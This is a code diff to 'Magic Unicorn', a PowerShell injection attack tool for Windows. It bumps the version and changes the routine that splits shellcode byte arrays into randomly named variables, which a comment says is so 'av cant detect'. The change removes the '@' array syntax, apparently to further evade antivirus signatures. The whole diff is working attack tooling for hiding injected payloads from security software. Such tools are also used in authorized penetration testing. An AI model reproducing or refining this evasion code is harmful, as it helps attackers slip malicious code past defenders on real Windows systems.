@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.4.3 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.4.4 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -489,7 +489,7 @@ def liquify_bytes(bytes, stub):
         goat_romper = generate_random_string(2,4)
         whopper = "royalewithcheese" # pulp fiction reference
         bytes = bytes.split(",0x8b,0x52,0x0c,")
-        bytes = (bytes[0] + ");$" + goat_romper + "=@(0x8b,0x52,0x0c," + bytes[1])
+        bytes = (bytes[0] + ");$" + goat_romper + "=(0x8b,0x52,0x0c," + bytes[1])
 
     # split again, we can do this all day
     whopper2 = ""
@@ -497,12 +497,12 @@ def liquify_bytes(bytes, stub):
         goat_romper2 = generate_random_string(2,4)
         whopper2 = "royalewithcheese"
         bytes = bytes.split(",0xc7,0xe2,")
-        bytes = (bytes[0] + ");$" + goat_romper2 + "=@(0xc7,0xe2," + bytes[1])
+        bytes = (bytes[0] + ");$" + goat_romper2 + "=(0xc7,0xe2," + bytes[1])
 
     bytes = bytes.split(",")
     counter = 0
     a1 = generate_random_string(2,2)
-    assemble = ("$" + a1 +"=@(")
+    assemble = ("$" + a1 +"=(")
 
     # randomize numbers so av cant detect
     b1 = generate_random_number(300,400)
@@ -521,7 +521,7 @@ def liquify_bytes(bytes, stub):
         if counter >= b1:
             if counter == b1:
                 a2 = generate_random_string(2,2)
-                assemble = (assemble + ");" + "$" + a2 + "=@(") + byte + ","
+                assemble = (assemble + ");" + "$" + a2 + "=(") + byte + ","
 
             if counter != b1:
                 if counter < b2:
@@ -529,7 +529,7 @@ def liquify_bytes(bytes, stub):
                 if counter >= b2:
                     if counter == b2:
                         a3 = generate_random_string(2,2)
-                        assemble = (assemble + ");" + "$" + a3 + "=@(") + byte + ","
+                        assemble = (assemble + ");" + "$" + a3 + "=(") + byte + ","
                     if counter > b2:
                         if counter < b3:
                             assemble = assemble + byte + ","
@@ -537,7 +537,7 @@ def liquify_bytes(bytes, stub):
                         if counter >= b3:
                             if counter == b3:
                                 a4 = generate_random_string(2,2)
-                                assemble = (assemble + ");" + "$" + a4 + "=@(") + byte + ","
+                                assemble = (assemble + ");" + "$" + a4 + "=(") + byte + ","
                             if counter != b3:
                                 assemble = assemble + byte + ","
 
@@ -548,7 +548,7 @@ def liquify_bytes(bytes, stub):
                         if counter >= b5:
                             if counter == b5:
                                 a5 = generate_random_string(2,2)
-                                assemble = (assemble + ");" + "$" + a5 + "=@(") + byte + ","
+                                assemble = (assemble + ");" + "$" + a5 + "=(") + byte + ","
                             if counter != b5:
                                 assemble = assemble + byte + ","
 
@@ -559,7 +559,7 @@ def liquify_bytes(bytes, stub):
                         if counter >= b6:
                             if counter == b6:
                                 a6 = generate_random_string(2,2)
-                                assemble = (assemble + ");" + "$" + a6 + "=@(") + byte + ","
+                                assemble = (assemble + ");" + "$" + a6 + "=(") + byte + ","
                             if counter != b6:
                                 assemble = assemble + byte + ","
 
@@ -570,7 +570,7 @@ def liquify_bytes(bytes, stub):
                         if counter >= b7:
                             if counter == b7:
                                 a7 = generate_random_string(2,2)
-                                assemble = (assemble + ");" + "$" + a7 + "=@(") + byte + ","
+                                assemble = (assemble + ");" + "$" + a7 + "=(") + byte + ","
                             if counter != b7:
                                 assemble = assemble + byte + ","
 
